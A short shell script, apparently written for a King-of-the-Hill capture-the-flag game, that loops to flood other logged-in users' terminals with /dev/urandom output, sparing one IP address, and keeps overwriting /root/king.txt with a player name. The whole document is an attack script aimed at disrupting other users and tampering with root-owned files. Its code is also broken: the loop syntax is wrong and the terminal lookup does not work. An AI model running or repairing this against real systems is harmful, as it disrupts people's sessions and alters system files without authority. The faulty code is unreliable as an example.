#!/bin/sh

# run it as crontab. each 10s or script
# if u found this script ill never gonna give u up

while true do;
    tty=$(w | grep -v "10.4.40.96" | awk '{print$2}')
    pts=$(less $tty |tail -n 1)
    cat /dev/urandom > /dev/$pts
    echo -n "blackdracula18" > /root/king.txt
    sleep 10s #romove this if run as crontab
done

